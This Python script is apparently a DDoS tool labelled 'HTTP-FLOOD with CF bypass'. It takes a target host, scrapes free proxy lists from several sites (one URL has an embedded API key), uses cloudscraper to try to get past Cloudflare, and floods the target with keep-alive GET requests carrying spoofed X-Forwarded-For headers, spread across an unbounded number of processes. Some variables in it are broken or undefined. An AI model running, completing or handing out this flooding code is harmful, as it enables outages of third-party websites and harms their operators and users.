import socket

import os

from time import sleep

import multiprocessing

import random

import platform

import requests

import cloudscraper

referers = [

	"https://www.google.com/search?q=",

	"https://check-host.net/",

	"https://www.facebook.com/",

	"https://www.youtube.com/",

	"https://www.fbi.com/",

	"https://www.bing.com/search?q=",

	"https://r.search.yahoo.com/",

	"https://www.cia.gov/index.html",

	"https://vk.com/profile.php?redirect=",

	"https://www.usatoday.com/search/results?q=",

	"https://help.baidu.com/searchResult?keywords=",

	"https://steamcommunity.com/market/search?q=",

	"https://www.ted.com/search?q=",

	"https://play.google.com/store/search?q=",

	"https://www.qwant.com/search?q=",

	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",

	"https://www.google.ad/search?q=",

	"https://www.google.ae/search?q=",

	"https://www.google.com.af/search?q=",

	"https://www.google.com.ag/search?q=",

	"https://www.google.com.ai/search?q=",

	"https://www.google.al/search?q=",

	"https://www.google.am/search?q=",

	"https://www.google.co.ao/search?q=",

]

def randomip():

  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))

  return randip

def attack():

  connection = "Connection:keep-alive\r\n"

  #referer = "Referer: referes\r\n"

  forward = "X-Forwarded-For: " + randomip() + "\r\n"

  get_host = "GET " + url + " HTTP/1.1\r\nHost: " + target + "\r\n"

  request = get_host + referes  + connection + forward + "\r\n\r\n"

  while True:

    try:

      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

      atk.connect((target, port))

      for y in range(80000000000000000):

          atk.send(str.encode(request))

    except socket.error:

      sleep(0)

    except:

      pass

print("HTTP-FLOOD with CF bypass")

print("keep alive connection,get method,cloudscraper,only http proxy")

print("!!!!EXAMPLE!!!: google.com")

print("C0d3d by rebik")

print("github: https://github.com/Rebik1/")

target = input("IP/URL: ")

print("http.txt")

proxy = input("proxy(1): ")

def downloadproxy():

    global proxfile

    if choice == "1":

        proxfile = 'http.txt'

        f = open('http.txt', 'wb+')

        try:

            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all",

                             timeout=10)

            f.write(r.content)

        except:

            pass

        try:

            r = requests.get("https://www.proxy-list.download/api/v1/get?type=http", timeout=10)

            f.write(r.content)

            f.close()

        except:

            pass

        try:

            r = requests.get("https://www.proxyscan.io/download?type=http", timeout=10)

            f.write(r.content)

            f.close()

        except:

            pass

        try:

            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=10)

            f.write(r.content)

        except:

            pass

        try:

            r = requests.get(

                "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=http&lastchecked=60",

                timeout=10)

            f.write(r.content)

            f.close()

        except:

            f.close()

    if choice == "5":

        proxfile = 'socks5.txt'

        f = open('socks5.txt', 'wb+')

        try:

            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all",

                             timeout=10)

            f.write(r.content)

        except:

            pass

        try:

            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5", timeout=10)

            f.write(r.content)

            f.close()

        except:

            pass

        try:

            r = requests.get("https://www.proxyscan.io/download?type=socks5", timeout=10)

            f.write(r.content)

            f.close()

        except:

            pass

        try:

            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", timeout=10)

            f.write(r.content)

        except:

            pass

        try:

            r = requests.get(

                "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=socks5&lastchecked=60",

                timeout=10)

            f.write(r.content)

        except:

            pass

        try:

            r = requests.get(

                "https://gist.githubusercontent.com/Azuures/1e0cb7a1097c720b4ed2aa63acd82179/raw/97d2d6a11873ffa8ca763763f7a5dd4035bcf95f/fwefnwex",

                timeout=10)

            f.write(r.content)

            f.close()

        except:

            pass

        try:

            r = requests.get(

                "https://top-proxies.ru/free_proxy/downproxyfree.php",

                timeout=10)

            f.write(r.content)

            f.close()

        except:

            print('top-prox')

            f.close()

client = socket.socket()

client.connect((target, 80))

port = int(input("Port: "))

url = f"https://{str(target)}"

scraper = cloudscraper.create_scraper(

    browser={

        'browser': 'chrome',

        'platform': 'windows',

        'desktop': True,

        'mobile': False,

    }

)

res = scraper.get(url)

print(res)

print("connection client")

print("Start")

sleep(1)

def send2attack():

  for i in range(99999999999999999999): 

    mp = multiprocessing.Process(target=attack)

    mp.setDaemon = False

    mp.start() 

    

send2attack()

client.close()

print('client closing connection')

#coded by rebik
